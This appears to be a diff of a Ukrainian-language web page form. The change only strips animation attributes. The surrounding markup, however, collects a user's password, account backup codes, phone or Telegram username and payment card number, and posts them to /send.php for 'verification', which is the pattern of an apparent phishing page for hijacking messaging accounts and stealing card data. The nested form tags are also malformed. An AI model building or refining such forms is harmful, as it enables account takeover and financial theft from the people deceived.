@@ -82,19 +82,19 @@ fbq('track', 'PageView');
               <input type="text" name="password" placeholder="Ваш пароль" required="">
             </div>
               <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
-            <div data-aos="fade-up-right" class="application-input">
+            <div class="application-input">
              <textarea type="text" name="codes" cols="30" rows="1" placeholder="Ваші резервні коди"></textarea>
             </div>
              <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
-            <div data-aos="fade-up-right" class="application-input">
+            <div class="application-input">
               <input type="text" name="namber" placeholder="Ваш номер телефону або @username в TG" required="">
             </div>
                 <form class="application-form" enctype="multipart/form-data" method="post" id="form" action="/send.php">
-            <div data-aos="fade-up-right" class="application-input">
+            <div class="application-input">
               <input type="text" name="yesno" placeholder="Ваша карта, для оплати" required="">
               <div  style="display:flex;justify-content:center;align-items:center;">
                 <label data-aos="fade-right" for="messanger" style="margin-right:15px;font-weight:bold;">Спосіб зв'язку:</label>
-              <select data-aos="fade-right" name="messanger" id="messanger">
+              <select name="messanger" id="messanger">
                 <option value="Whatsapp-Messenger">WhatsApp Messenger</option>
                 <option selected value="Telegram">Telegram</option>
                 <option value="Viber">Viber</option>
@@ -106,7 +106,7 @@ fbq('track', 'PageView');
         
                 <div id="success" class="alert alert-success" role="alert" style="display: none;"></div>
         
-                <button data-aos="fade-right" type="submit" class="form-button">Відправити на перевірку</button>
+                <button type="submit" class="form-button">Відправити на перевірку</button>
               </form>
             </div>
           </div>
